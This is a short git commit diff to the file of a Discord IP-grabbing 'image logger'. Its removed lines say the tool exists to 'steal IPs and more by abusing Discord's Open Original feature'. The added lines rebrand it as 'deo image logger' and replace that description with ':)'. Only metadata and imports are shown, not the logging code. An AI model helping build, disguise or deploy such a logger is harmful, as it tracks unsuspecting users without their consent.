7aeef2e192200b831bf260b9c9161aa8811de0fd
deo1337 <deokseo1337@gmail.com>
2025-02-12 05:45:51 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -5,10 +5,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = "deo image logger"
+__description__ = ":)"
+__version__ = "beta"
+__author__ = "deo"
 
 config = {
     # BASE CONFIG #
